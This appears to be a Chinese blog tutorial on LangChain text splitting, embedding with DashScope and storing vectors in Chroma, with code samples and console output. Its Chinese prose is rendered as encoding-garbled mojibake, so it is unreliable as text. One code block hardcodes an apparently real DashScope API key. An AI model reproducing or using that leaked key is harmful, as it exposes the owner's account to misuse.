<p>åœ¨ä½¿ç”¨<code>CharacterTextSplitter</code>æ„é€ å‡½æ•°çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ é€’è¿™å‡ ä¸ªå‚æ•°ï¼š -æŒ‡å®šç”¨äºåˆ†å‰²æ–‡æœ¬çš„åˆ†éš”ç¬¦ã€‚<code>separator</code>ï¼Œæ¯ä¸€ä¸ªåˆ†å‰²åæ–‡æœ¬å—çš„å¤§å°<code>chunk_size</code>å½“æ–‡æœ¬é•¿åº¦è¶…è¿‡ chunk_size æ—¶ï¼ŒCharacterTextSplitter ä¼šå°½é‡åœ¨ separator å¤„è¿›è¡Œåˆ‡åˆ†ï¼Œä»¥é¿å…åœ¨å¥å­æˆ–æ®µè½ä¸­é—´åˆ‡æ–­ã€‚</p>
<ul>
<li>æ¯ä¸ªæ–‡æœ¬å—ï¼ˆchunkï¼‰çš„æœ€å¤§é•¿åº¦ï¼Œ<code>chunk_size</code>,åˆ†å‰²åçš„æ¯ä¸€æ®µæ–‡æœ¬é•¿åº¦ä¸ä¼šæ˜¾è‘—è¶…è¿‡è¿™ä¸ªå€¼</li>
<li>ç›¸é‚»æ–‡æœ¬å—ä¹‹é—´çš„é‡å å­—ç¬¦æ•°,<code>chunk_overlap</code>ã€‚ä¸ºäº†ä¿æŒä¸Šä¸‹æ–‡è¿è´¯æ€§ï¼Œåä¸€ä¸ª chunk ä¼šåŒ…å«å‰ä¸€ä¸ª chunk æœ«å°¾çš„è‹¥å¹²å­—ç¬¦ã€‚è¿™é‡Œè®¾ç½®ä¸º 80ï¼Œæ„å‘³ç€æ¯ä¸ª chunk çš„å¼€å¤´ 80 ä¸ªå­—ç¬¦ä¼šå’Œå‰ä¸€ä¸ª chunk çš„ç»“å°¾ 80 ä¸ªå­—ç¬¦é‡å¤ã€‚</li>
<li>ç”¨äºè®¡ç®—æ–‡æœ¬é•¿åº¦çš„å‡½æ•°ã€‚<code>length_function</code>,é»˜è®¤æ˜¯ Python å†…ç½®çš„ len()ï¼Œå³æŒ‰å­—ç¬¦æ•°è®¡ç®—é•¿åº¦ã€‚ä½†ä½ å¯ä»¥æ›¿æ¢ä¸ºå…¶ä»–å‡½æ•°ï¼Œæ¯”å¦‚ä½¿ç”¨ token è®¡æ•°å™¨ï¼ˆå¦‚ tiktokenï¼‰æ¥æŒ‰ token æ•°åˆ†å‰²ï¼Œè¿™åœ¨ä½¿ç”¨ LLMï¼ˆå¤§è¯­è¨€æ¨¡å‹ï¼‰æ—¶æ›´å¸¸è§ï¼Œå› ä¸ºæ¨¡å‹é€šå¸¸æœ‰ token é™åˆ¶ã€‚</li>
</ul>
<p>å®Œæ•´ä»£ç å¦‚ä¸‹</p>
<pre><code class="hljs language-ini" lang="ini">      from langchain_community.document_loaders import DirectoryLoader, TextLoader
    from langchain.text_splitter import CharacterTextSplitter

    <span class="hljs-comment"># 1. åŠ è½½ Markdown æ–‡æ¡£</span>
    <span class="hljs-attr">md_docs</span> = DirectoryLoader(
        "../doc",
        <span class="hljs-attr">glob</span>=<span class="hljs-string">"**/*.md"</span>,
        <span class="hljs-attr">loader_cls</span>=TextLoader,
        <span class="hljs-attr">show_progress</span>=<span class="hljs-literal">True</span>,
        <span class="hljs-attr">use_multithreading</span>=<span class="hljs-literal">True</span>,
        <span class="hljs-attr">silent_errors</span>=<span class="hljs-literal">True</span>
    ).load()

    print(f"âœ… å…±åŠ è½½ {len(md_docs)} ä¸ªæ–‡æ¡£")

    <span class="hljs-comment"># 2. åˆå§‹åŒ–æ–‡æœ¬åˆ†å‰²å™¨</span>
    <span class="hljs-attr">text_splitter</span> = CharacterTextSplitter(
        <span class="hljs-attr">separator</span>=<span class="hljs-string">"\n\n"</span>,      <span class="hljs-comment"># ä¼˜å…ˆåœ¨æ®µè½ä¹‹é—´åˆ‡åˆ†</span>
        <span class="hljs-attr">chunk_size</span>=<span class="hljs-number">500</span>,        <span class="hljs-comment"># æ¯å—æœ€å¤š 500 ä¸ªå­—ç¬¦</span>
        <span class="hljs-attr">chunk_overlap</span>=<span class="hljs-number">80</span>,      <span class="hljs-comment"># ç›¸é‚»å—é‡å  80 ä¸ªå­—ç¬¦</span>
        <span class="hljs-attr">length_function</span>=len    <span class="hljs-comment"># æŒ‰å­—ç¬¦æ•°è®¡ç®—é•¿åº¦</span>
    )

    <span class="hljs-comment"># 3. æ‰§è¡Œåˆ†å‰²</span>
    <span class="hljs-attr">split_docs</span> = text_splitter.split_documents(md_docs)

    print(f"âœ‚ï¸ åˆ†å‰²åå¾—åˆ° {len(split_docs)} ä¸ªæ–‡æœ¬å—\n")

    <span class="hljs-comment"># 4. æ‰“å°æ¯ä¸ª chunk çš„å†…å®¹ï¼ˆå¯é€‰ï¼šåªæ‰“å°å‰ 3 ä¸ªæˆ–å…¨éƒ¨ï¼‰</span>
    for i, doc in enumerate(split_docs<span class="hljs-section">[:5]</span>, 1):  <span class="hljs-comment"># è¿™é‡Œåªå±•ç¤ºå‰ 5 ä¸ªï¼Œé¿å…åˆ·å±</span>
        print(f"--- Chunk {i} (é•¿åº¦: {len(doc.page_content)} å­—ç¬¦) ---")
        print(doc.page_content<span class="hljs-section">[:300]</span> + ("..." if len(doc.page_content) &gt; 300 else ""))  <span class="hljs-comment"># æˆªæ–­æ˜¾ç¤º</span>
        print()
</code></pre>
<p>æˆ‘ä»¬è¿™é‡Œå°±ç›´æ¥æŸ¥çœ‹åˆ†å‰²ä¹‹åçš„æ–‡æ¡£</p>
<pre><code class="hljs language-ruby" lang="ruby"> Â  Â  Â <span class="hljs-number">100</span><span class="hljs-string">%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ|</span> <span class="hljs-number">8</span>/<span class="hljs-number">8</span> [<span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span>&lt;<span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span>, <span class="hljs-number">3795</span>.32it/s]
 Â  Â <span class="hljs-title class_">Created</span> a chunk of size <span class="hljs-number">762</span>, which is longer than the specified <span class="hljs-number">500</span>
 Â  Â <span class="hljs-title class_">Created</span> a chunk of size <span class="hljs-number">601</span>, which is longer than the specified <span class="hljs-number">500</span>
 Â  Â <span class="hljs-title class_">Created</span> a chunk of size <span class="hljs-number">560</span>, which is longer than the specified <span class="hljs-number">500</span>
 Â  Â âœ… å…±åŠ è½½ <span class="hljs-number">8</span> ä¸ªæ–‡æ¡£
 Â  Â âœ‚ï¸ åˆ†å‰²åå¾—åˆ° <span class="hljs-number">18</span> ä¸ªæ–‡æœ¬å—
â€‹
 Â  Â --- <span class="hljs-title class_">Chunk</span> <span class="hljs-number">1</span> (é•¿åº¦: <span class="hljs-number">414</span> å­—ç¬¦) ---
 Â  Â <span class="hljs-comment"># Java å¹¶å‘ä¸é”</span>
â€‹
 Â  Â <span class="hljs-comment">## å¯è§æ€§/æœ‰åºæ€§/åŸå­æ€§</span>
 Â  Â - volatileï¼šä¿è¯å¯è§æ€§ä¸ç¦æ­¢æŒ‡ä»¤é‡æ’ï¼Œä¸ä¿è¯åŸå­æ€§
 Â  Â - synchronizedï¼šå¯é‡å…¥äº’æ–¥ï¼Œå†…ç½®é”ï¼Œè¿›å…¥/é€€å‡ºæœ‰å†…å­˜è¯­ä¹‰
 Â  Â - <span class="hljs-variable constant_">CAS</span>ï¼šåŸå­æ›´æ–°ï¼Œéœ€é…åˆè‡ªæ—‹/é€€é¿
â€‹
 Â  Â <span class="hljs-comment">## å¸¸ç”¨å¹¶å‘å·¥å…·</span>
 Â  Â - <span class="hljs-title class_">CountDownLatch</span>/<span class="hljs-title class_">CyclicBarrier</span>/<span class="hljs-title class_">Semaphore</span>
 Â  Â - <span class="hljs-title class_">ReentrantLock</span>/<span class="hljs-title class_">ReadWriteLock</span>/<span class="hljs-title class_">StampledLock</span>
 Â  Â - <span class="hljs-title class_">CompletableFuture</span>ï¼šå¼‚æ­¥ç¼–æ’ allOf/anyOfï¼Œå¼‚å¸¸å¤„ç† exceptionally
â€‹
 Â  Â <span class="hljs-comment">## æ— é”/åˆ†æ®µé”</span>
 Â  Â - <span class="hljs-title class_">LongAdder</span> åœ¨é«˜å¹¶å‘è®¡æ•°åœºæ™¯ä¼˜äº ...
â€‹
 Â  Â --- <span class="hljs-title class_">Chunk</span> <span class="hljs-number">2</span> (é•¿åº¦: <span class="hljs-number">160</span> å­—ç¬¦) ---
 Â  Â <span class="hljs-comment">## è®¾è®¡åŸåˆ™</span>
 Â  Â - ç¼©å°é”ç²’åº¦ï¼Œå°½é‡æ— é”/è¯»å†™åˆ†ç¦»
 Â  Â - é¿å…åµŒå¥—é”ï¼Œéµå¾ªå›ºå®šåŠ é”é¡ºåº
 Â  Â - æ§åˆ¶ä¸´ç•ŒåŒºè€—æ—¶ï¼Œé¿å…åœ¨é”å†…åš <span class="hljs-variable constant_">IO</span>
â€‹
 Â  Â <span class="hljs-comment">## åœºæ™¯ç¤ºä¾‹</span>
 Â  Â - é«˜å¹¶å‘è®¡æ•°ï¼š<span class="hljs-title class_">LongAdder</span>
 Â  Â - é«˜è¯»ä½å†™ç¼“å­˜ï¼š<span class="hljs-title class_">ReadWriteLock</span> æˆ– <span class="hljs-title class_">Caffeine</span>
 Â  Â - ä»»åŠ¡ç¼–æ’ï¼š<span class="hljs-title class_">CompletableFuture</span> å¹¶è¡Œæ‹‰å– + è¶…æ—¶å…œåº•
â€‹
 Â  Â --- <span class="hljs-title class_">Chunk</span> <span class="hljs-number">3</span> (é•¿åº¦: <span class="hljs-number">385</span> å­—ç¬¦) ---
 Â  Â <span class="hljs-comment"># Spring Boot æœ€ä½³å®è·µ</span>
â€‹
 Â  Â <span class="hljs-comment">## åˆ†å±‚ä¸è¾¹ç•Œ</span>
 Â  Â - <span class="hljs-title class_">Controller</span>ï¼šæ ¡éªŒ/é‰´æƒ/ç¼–æ’
 Â  Â - <span class="hljs-title class_">Service</span>ï¼šä¸šåŠ¡è§„åˆ™ä¸äº‹åŠ¡
 Â  Â - <span class="hljs-title class_">Repository</span>ï¼šæŒä¹…åŒ–ï¼Œç¦æ­¢ä¸šåŠ¡é€»è¾‘
â€‹
 Â  Â <span class="hljs-comment">## é…ç½®ä¸ç¯å¢ƒ</span>
 Â  Â - ä½¿ç”¨åˆ†ç¯å¢ƒ ymlï¼šdev/test/prod
 Â  Â - å¤–éƒ¨åŒ–é…ç½®ï¼Œä¸¥ç¦æŠŠå¯†é’¥å†™å…¥ä»£ç 
â€‹
 Â  Â <span class="hljs-comment">## äº‹åŠ¡ä¸å¹‚ç­‰</span>
 Â  Â - ä»¥ <span class="hljs-title class_">Service</span> ä¸ºç²’åº¦ï¼Œ<span class="hljs-variable">@Transactional</span> æ”¾åœ¨ <span class="hljs-keyword">public</span> æ–¹æ³•
 Â  Â - å¤–éƒ¨æ¥å£æä¾›å¹‚ç­‰é”®ï¼ˆå¦‚ä¸šåŠ¡å•å·ï¼‰ï¼Œé¿å…é‡å¤æ‰£æ¬¾
â€‹
 Â  Â <span class="hljs-comment">## æ€§èƒ½ä¸ç¨³å®šæ€§</span>
 Â  Â - è¿æ¥æ± ï¼š<span class="hljs-title class_">Hikari</span> è¿æ¥æ•°ã€è¶…æ—¶
 Â  Â - åºåˆ—åŒ–ï¼š<span class="hljs-title class_">Jackson</span> æŒ‰éœ€è£å‰ªã€ç¦ç”¨é»˜è®¤ç©ºå¯¹è±¡
 Â  Â - ç»Ÿä¸€å¼‚å¸¸å¤„ç†ä¸é”™è¯¯ç 
 Â  Â - ...
â€‹
 Â  Â --- <span class="hljs-title class_">Chunk</span> <span class="hljs-number">4</span> (é•¿åº¦: <span class="hljs-number">124</span> å­—ç¬¦) ---
 Â  Â <span class="hljs-comment"># æ•…éšœæ’æŸ¥ä¸ä¿®å¤è®°å½•</span>
â€‹
 Â  Â &gt; æœ¬æ–‡æ±‡æ€»è¿‘æœŸåœ¨æœ¬é¡¹ç›®ä¸­é‡åˆ°çš„é”™è¯¯ã€åŸå› å®šä½ä¸å¯¹åº”ä¿®å¤æ–¹æ¡ˆã€‚
â€‹
 Â  Â ---
â€‹
 Â  Â <span class="hljs-comment">## 1) AttributeError: 'coroutine' object has no attribute 'aget_messages'</span>
â€‹
 Â  Â --- <span class="hljs-title class_">Chunk</span> <span class="hljs-number">5</span> (é•¿åº¦: <span class="hljs-number">762</span> å­—ç¬¦) ---
 Â  Â - **æŠ¥é”™æ ˆè¦ç‚¹**ï¼š
 Â  Â  Â - å‡ºç°åœ¨ <span class="hljs-string">`RunnableWithMessageHistory`</span> çš„å†å²è·å–é˜¶æ®µï¼ŒæœŸæœ›æ‹¿åˆ°å†å²å®ä¾‹ï¼Œå´å¾—åˆ°ä¸€ä¸ªåç¨‹å¯¹è±¡ã€‚
 Â  Â - **æ ¹å› **ï¼š
 Â  Â  Â - <span class="hljs-string">`get_session_history`</span> è¢«å®ç°ä¸º <span class="hljs-string">`async def`</span>ï¼Œè°ƒç”¨å¤„æœª <span class="hljs-string">`await`</span>ï¼›<span class="hljs-string">`RunnableWithMessageHistory`</span> ä¸ä¼šè‡ªåŠ¨ <span class="hljs-string">`await`</span> å†å²å·¥å‚ã€‚
 Â  Â - **ä¿®å¤**ï¼š
 Â  Â  Â - å°†å†å²å·¥å‚æ”¹ä¸ºåŒæ­¥å‡½æ•°ï¼Œç›´æ¥è¿”å› <span class="hljs-string">`SQLChatMessageHistory`</span> å®ä¾‹ï¼›è°ƒç”¨å¤„ä¹Ÿæ”¹ä¸ºåŒæ­¥å‡½æ•°ã€‚
 Â  Â - **å…³é”®ä»£ç **ï¼š
 Â   <span class="hljs-string">``</span><span class="hljs-string">`9:15:/Users/fenghuanwan...
â€‹
â€‹
 Â  Â Process finished with exit code 0
â€‹
</span></code></pre>
<ul>
<li>æ–‡æœ¬åµŒå…¥æ¨¡å‹</li>
</ul>
<p>æ£€ç´¢çš„å¦ä¸€ä¸ªå…³é”®éƒ¨åˆ†æ˜¯ä¸ºæ–‡æ¡£åˆ›å»ºåµŒå…¥. åµŒå…¥æ•æ‰æ–‡æœ¬çš„è¯­ä¹‰å«ä¹‰ï¼Œä½¿èƒ½å¤Ÿå¿«é€Ÿé«˜æ•ˆåœ°æŸ¥æ‰¾å…¶ä»–ç›¸ä¼¼çš„æ–‡æœ¬. LangChain ä¸ 25 å¤šä¸ªä¸åŒçš„åµŒå…¥æä¾›å•†å’Œæ–¹æ³•è¿›è¡Œé›†æˆï¼Œ ä»å¼€æºåˆ°ä¸“æœ‰ APIï¼Œ ä½¿èƒ½å¤Ÿé€‰æ‹©æœ€é€‚åˆæ‚¨éœ€æ±‚çš„ä¸€ç§. LangChain æä¾›äº†æ ‡å‡†æ¥å£ï¼Œä½¿æˆ‘ä»¬å¯ä»¥è½»æ¾åˆ‡æ¢æ¨¡å‹.</p>
<p>ä¹Ÿå°±æ˜¯ embeddingsï¼Œä»–å°±æ˜¯ç”¨æ¥æŠŠæˆ‘ä»¬åˆ†å‰²å¥½çš„æ–‡æœ¬è½¬åŒ–ä¸ºå‘é‡æ•°æ®çš„ï¼Œå¹¶å­˜å‚¨åˆ°åç»­çš„å‘é‡æ•°æ®åº“ä¸­å»ã€‚</p>
<p>è¿™äº›æ˜¯ langchain æ”¯æŒçš„æ–‡æœ¬åµŒå…¥æ¨¡å‹ï¼Œå¯ä»¥æŸ¥çœ‹<strong>langchain_community.embeddings</strong>ä¸­çš„æ‰€ç»™å‡ºæ¥çš„æ‰€æœ‰æ–‡æœ¬åµŒå…¥æ¨¡å‹ã€‚</p>
<pre><code class="hljs language-ini" lang="ini"> Â  Â <span class="hljs-attr">__all__</span> = [
 Â  Â <span class="hljs-string">"AlephAlphaAsymmetricSemanticEmbedding"</span>,
 Â  Â <span class="hljs-string">"AlephAlphaSymmetricSemanticEmbedding"</span>,
 Â  Â <span class="hljs-string">"AnyscaleEmbeddings"</span>,
 Â  Â <span class="hljs-string">"AscendEmbeddings"</span>,
 Â  Â <span class="hljs-string">"AwaEmbeddings"</span>,
 Â  Â <span class="hljs-string">"AzureOpenAIEmbeddings"</span>,
 Â  Â <span class="hljs-string">"BaichuanTextEmbeddings"</span>,
 Â  Â <span class="hljs-string">"BedrockEmbeddings"</span>,
 Â  Â <span class="hljs-string">"BookendEmbeddings"</span>,
 Â  Â <span class="hljs-string">"ClarifaiEmbeddings"</span>,
 Â  Â <span class="hljs-string">"ClovaEmbeddings"</span>,
 Â  Â <span class="hljs-string">"ClovaXEmbeddings"</span>,
 Â  Â <span class="hljs-string">"CohereEmbeddings"</span>,
 Â  Â <span class="hljs-string">"DashScopeEmbeddings"</span>,
 Â  Â <span class="hljs-string">"DatabricksEmbeddings"</span>,
 Â  Â <span class="hljs-string">"DeepInfraEmbeddings"</span>,
 Â  Â <span class="hljs-string">"DeterministicFakeEmbedding"</span>,
 Â  Â <span class="hljs-string">"EdenAiEmbeddings"</span>,
 Â  Â <span class="hljs-string">"ElasticsearchEmbeddings"</span>,
 Â  Â <span class="hljs-string">"EmbaasEmbeddings"</span>,
 Â  Â <span class="hljs-string">"ErnieEmbeddings"</span>,
 Â  Â <span class="hljs-string">"FakeEmbeddings"</span>,
 Â  Â <span class="hljs-string">"FastEmbedEmbeddings"</span>,
 Â  Â <span class="hljs-string">"GPT4AllEmbeddings"</span>,
 Â  Â <span class="hljs-string">"GigaChatEmbeddings"</span>,
 Â  Â <span class="hljs-string">"GooglePalmEmbeddings"</span>,
 Â  Â <span class="hljs-string">"GradientEmbeddings"</span>,
 Â  Â <span class="hljs-string">"HuggingFaceBgeEmbeddings"</span>,
 Â  Â <span class="hljs-string">"HuggingFaceEmbeddings"</span>,
 Â  Â <span class="hljs-string">"HuggingFaceHubEmbeddings"</span>,
 Â  Â <span class="hljs-string">"HuggingFaceInferenceAPIEmbeddings"</span>,
 Â  Â <span class="hljs-string">"HuggingFaceInstructEmbeddings"</span>,
 Â  Â <span class="hljs-string">"InfinityEmbeddings"</span>,
 Â  Â <span class="hljs-string">"InfinityEmbeddingsLocal"</span>,
 Â  Â <span class="hljs-string">"IpexLLMBgeEmbeddings"</span>,
 Â  Â <span class="hljs-string">"JavelinAIGatewayEmbeddings"</span>,
 Â  Â <span class="hljs-string">"JinaEmbeddings"</span>,
 Â  Â <span class="hljs-string">"JohnSnowLabsEmbeddings"</span>,
 Â  Â <span class="hljs-string">"LLMRailsEmbeddings"</span>,
 Â  Â <span class="hljs-string">"LaserEmbeddings"</span>,
 Â  Â <span class="hljs-string">"LlamaCppEmbeddings"</span>,
 Â  Â <span class="hljs-string">"LlamafileEmbeddings"</span>,
 Â  Â <span class="hljs-string">"LocalAIEmbeddings"</span>,
 Â  Â <span class="hljs-string">"MiniMaxEmbeddings"</span>,
 Â  Â <span class="hljs-string">"MlflowAIGatewayEmbeddings"</span>,
 Â  Â <span class="hljs-string">"MlflowCohereEmbeddings"</span>,
 Â  Â <span class="hljs-string">"MlflowEmbeddings"</span>,
 Â  Â <span class="hljs-string">"Model2vecEmbeddings"</span>,
 Â  Â <span class="hljs-string">"ModelScopeEmbeddings"</span>,
 Â  Â <span class="hljs-string">"MosaicMLInstructorEmbeddings"</span>,
 Â  Â <span class="hljs-string">"NLPCloudEmbeddings"</span>,
 Â  Â <span class="hljs-string">"NeMoEmbeddings"</span>,
 Â  Â <span class="hljs-string">"OCIGenAIEmbeddings"</span>,
 Â  Â <span class="hljs-string">"OctoAIEmbeddings"</span>,
 Â  Â <span class="hljs-string">"OllamaEmbeddings"</span>,
 Â  Â <span class="hljs-string">"OpenAIEmbeddings"</span>,
 Â  Â <span class="hljs-string">"OpenVINOBgeEmbeddings"</span>,
 Â  Â <span class="hljs-string">"OpenVINOEmbeddings"</span>,
 Â  Â <span class="hljs-string">"OracleEmbeddings"</span>,
 Â  Â <span class="hljs-string">"OVHCloudEmbeddings"</span>,
 Â  Â <span class="hljs-string">"PremAIEmbeddings"</span>,
 Â  Â <span class="hljs-string">"QianfanEmbeddingsEndpoint"</span>,
 Â  Â <span class="hljs-string">"QuantizedBgeEmbeddings"</span>,
 Â  Â <span class="hljs-string">"QuantizedBiEncoderEmbeddings"</span>,
 Â  Â <span class="hljs-string">"SagemakerEndpointEmbeddings"</span>,
 Â  Â <span class="hljs-string">"SambaStudioEmbeddings"</span>,
 Â  Â <span class="hljs-string">"SelfHostedEmbeddings"</span>,
 Â  Â <span class="hljs-string">"SelfHostedHuggingFaceEmbeddings"</span>,
 Â  Â <span class="hljs-string">"SelfHostedHuggingFaceInstructEmbeddings"</span>,
 Â  Â <span class="hljs-string">"SentenceTransformerEmbeddings"</span>,
 Â  Â <span class="hljs-string">"SolarEmbeddings"</span>,
 Â  Â <span class="hljs-string">"SpacyEmbeddings"</span>,
 Â  Â <span class="hljs-string">"SparkLLMTextEmbeddings"</span>,
 Â  Â <span class="hljs-string">"TensorflowHubEmbeddings"</span>,
 Â  Â <span class="hljs-string">"TextEmbedEmbeddings"</span>,
 Â  Â <span class="hljs-string">"TitanTakeoffEmbed"</span>,
 Â  Â <span class="hljs-string">"VertexAIEmbeddings"</span>,
 Â  Â <span class="hljs-string">"VolcanoEmbeddings"</span>,
 Â  Â <span class="hljs-string">"VoyageEmbeddings"</span>,
 Â  Â <span class="hljs-string">"XinferenceEmbeddings"</span>,
 Â  Â <span class="hljs-string">"YandexGPTEmbeddings"</span>,
 Â  Â <span class="hljs-string">"ZhipuAIEmbeddings"</span>,
 Â  Â <span class="hljs-string">"HunyuanEmbeddings"</span>,
]
</code></pre>
<p>åœ¨è¿™é‡Œæˆ‘ä»¬å°±ä½¿ç”¨é˜¿é‡Œçš„<code>DashScopeEmbeddings</code></p>
<pre><code class="hljs language-ini" lang="ini">  from langchain_community.embeddings import DashScopeEmbeddings
  <span class="hljs-attr">embeddings</span> = DashScopeEmbeddings(model=<span class="hljs-string">"text-embedding-v2"</span>,dashscope_api_key=<span class="hljs-string">"my-api-key"</span>)
</code></pre>
<p>è¿™æ ·æˆ‘ä»¬å°±çš„åˆ°äº†ä¸€ä¸ªæ–‡æœ¬åµŒå…¥æ¨¡å‹ç”¨æ¥è¿›è¡Œå‘é‡çš„è½¬åŒ–ï¼Œåç»­å‘¢è¿˜éœ€è¦é…åˆå‘é‡æ•°æ®åº“è¿›è¡Œå‘é‡å­˜å‚¨ã€‚</p>
<ul>
<li>å‘é‡å­˜å‚¨</li>
</ul>
<p>éšç€åµŒå…¥çš„å…´èµ·ï¼Œå‡ºç°äº†å¯¹æ”¯æŒè¿™äº›åµŒå…¥çš„æ•°æ®åº“çš„éœ€æ±‚. LangChain ä¸ 50 å¤šä¸ªä¸åŒçš„å‘é‡å­˜å‚¨è¿›è¡Œé›†æˆï¼Œä»å¼€æºæœ¬åœ°å­˜å‚¨åˆ°äº‘æ‰˜ç®¡ä¸“æœ‰å­˜å‚¨ï¼Œ ä½¿èƒ½å¤Ÿé€‰æ‹©æœ€é€‚åˆæ‚¨éœ€æ±‚çš„ä¸€ç§. LangChain å…¬å¼€äº†æ ‡å‡†æ¥å£ï¼Œä½¿æˆ‘ä»¬å¯ä»¥è½»æ¾åˆ‡æ¢å‘é‡å­˜å‚¨.</p>
<p>è¿™æ˜¯ LangChain æ”¯æŒçš„ä¸€ä¸‹å‡ ç§å‘é‡æ•°æ®åº“ï¼Œå¯ä»¥é€šè¿‡æºç æŸ¥çœ‹ï¼Œè¿™é‡Œå°±ä¸ä¸€ä¸€å±•ç¤º<code>langchain_community.vectorstores</code> æˆ‘ä»¬ä¸‹é¢è¦èŠçš„æ˜¯<code>Chroma</code>è¿™ä¸ªå‘é‡æ•°æ®åº“ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨ pgsql æ¥è¿›è¡Œå‘é‡çš„å­˜å‚¨</p>
<pre><code class="hljs language-ini" lang="ini"> Â  Â from langchain_community.document_loaders import DirectoryLoader, TextLoader
 Â  Â from langchain.text_splitter import CharacterTextSplitter
 Â  Â from langchain_community.embeddings import DashScopeEmbeddings
 Â  Â from langchain_chroma import Chroma Â <span class="hljs-comment"># âœ… ä½¿ç”¨æ–°åŒ…</span>
 Â  Â import os
â€‹
 Â  Â <span class="hljs-comment"># === é…ç½® ===</span>
 Â  Â <span class="hljs-attr">EMBEDDINGS_DIR</span> = <span class="hljs-string">"/Users/fenghuanwang/PythonProject/langchain-test/embeddings"</span>
 Â  Â <span class="hljs-attr">COLLECTION_NAME</span> = <span class="hljs-string">"java_docs"</span>
â€‹
 Â  Â <span class="hljs-comment"># 1. åŠ è½½æ–‡æ¡£</span>
 Â  Â <span class="hljs-attr">md_docs</span> = DirectoryLoader(
 Â  Â  Â  Â "../doc",
 Â  Â  Â  Â <span class="hljs-attr">glob</span>=<span class="hljs-string">"**/*.md"</span>,
 Â  Â  Â  Â <span class="hljs-attr">loader_cls</span>=TextLoader,
 Â  Â  Â  Â <span class="hljs-attr">show_progress</span>=<span class="hljs-literal">True</span>,
 Â  Â  Â  Â <span class="hljs-attr">use_multithreading</span>=<span class="hljs-literal">True</span>,
 Â  Â  Â  Â <span class="hljs-attr">silent_errors</span>=<span class="hljs-literal">True</span>
 Â   ).load()
â€‹
 Â  Â print(f"âœ… å…±åŠ è½½ {len(md_docs)} ä¸ªæ–‡æ¡£")
 Â  Â if not md_docs:
 Â  Â  Â  Â print("âš ï¸ æ²¡æœ‰åŠ è½½åˆ°ä»»ä½•æ–‡æ¡£ï¼Œè¯·æ£€æŸ¥ ../doc è·¯å¾„æ˜¯å¦æ­£ç¡®")
 Â  Â  Â  Â exit()
â€‹
 Â  Â <span class="hljs-comment"># 2. åˆ†å‰²æ–‡æ¡£</span>
 Â  Â <span class="hljs-attr">text_splitter</span> = CharacterTextSplitter(
 Â  Â  Â  Â <span class="hljs-attr">separator</span>=<span class="hljs-string">"\n\n"</span>,
 Â  Â  Â  Â <span class="hljs-attr">chunk_size</span>=<span class="hljs-number">500</span>,
 Â  Â  Â  Â <span class="hljs-attr">chunk_overlap</span>=<span class="hljs-number">80</span>,
 Â  Â  Â  Â <span class="hljs-attr">length_function</span>=len
 Â   )
 Â  Â <span class="hljs-attr">split_docs</span> = text_splitter.split_documents(md_docs)
 Â  Â print(f"âœ‚ï¸ åˆ†å‰²åå¾—åˆ° {len(split_docs)} ä¸ªæ–‡æœ¬å—")
â€‹
 Â  Â <span class="hljs-comment"># 3. Embedding æ¨¡å‹</span>
 Â  Â <span class="hljs-attr">embeddings</span> = DashScopeEmbeddings(
 Â  Â  Â  Â <span class="hljs-attr">model</span>=<span class="hljs-string">"text-embedding-v2"</span>,
 Â  Â  Â  Â <span class="hljs-attr">dashscope_api_key</span>=<span class="hljs-string">"sk-3e4b3b0a5513440f80a23349057c653f"</span>
 Â   )
â€‹
 Â  Â <span class="hljs-comment"># 4. å­˜å…¥ Chromaï¼ˆè‡ªåŠ¨æŒä¹…åŒ–ï¼‰</span>
 Â  Â print("ğŸ§  æ­£åœ¨ç”Ÿæˆå‘é‡å¹¶å­˜å…¥ Chroma...")
 Â  Â <span class="hljs-attr">vectorstore</span> = Chroma.from_documents(
 Â  Â  Â  Â <span class="hljs-attr">documents</span>=split_docs,
 Â  Â  Â  Â <span class="hljs-attr">embedding</span>=embeddings,
 Â  Â  Â  Â <span class="hljs-attr">persist_directory</span>=EMBEDDINGS_DIR,
 Â  Â  Â  Â <span class="hljs-attr">collection_name</span>=COLLECTION_NAME,
 Â   )
 Â  Â <span class="hljs-comment"># âœ… ä¸éœ€è¦ vectorstore.persist()</span>
â€‹
 Â  Â print(f"âœ… å‘é‡æ•°æ®å·²ä¿å­˜åˆ°: {os.path.abspath(EMBEDDINGS_DIR)}")
â€‹
 Â  Â <span class="hljs-comment"># 5. éªŒè¯ï¼šé‡æ–°åŠ è½½å¹¶è®¡æ•°</span>
 Â  Â print("\nğŸ” æ­£åœ¨é‡æ–°åŠ è½½å‘é‡åº“ä»¥éªŒè¯...")
 Â  Â <span class="hljs-attr">reloaded_db</span> = Chroma(
 Â  Â  Â  Â <span class="hljs-attr">persist_directory</span>=EMBEDDINGS_DIR,
 Â  Â  Â  Â <span class="hljs-attr">embedding_function</span>=embeddings,
 Â  Â  Â  Â <span class="hljs-attr">collection_name</span>=COLLECTION_NAME,
  )
</code></pre>
<p>æ§åˆ¶å°è¾“å‡º <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a01ecc3488a414a88c476d5121ec34f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSf5oCn55qE56iL5bqP5ZGY5bCP546L:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770491&amp;x-signature=mUOYOu4jwYtfNyXzXDB8SZZpwGA%3D" alt="" loading="lazy"/> åŒæ—¶ï¼Œå¯¹åº”çš„æœ¬åœ°ç›®å½•ä¹Ÿå‡ºç°äº†å‘é‡æ•°æ®: <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce515528c0e44ff987918fb8f7b34582~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSf5oCn55qE56iL5bqP5ZGY5bCP546L:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770491&amp;x-signature=hybWexjqyW%2BNzzdSXB1C3ll4nBo%3D" alt="" loading="lazy"/> <img 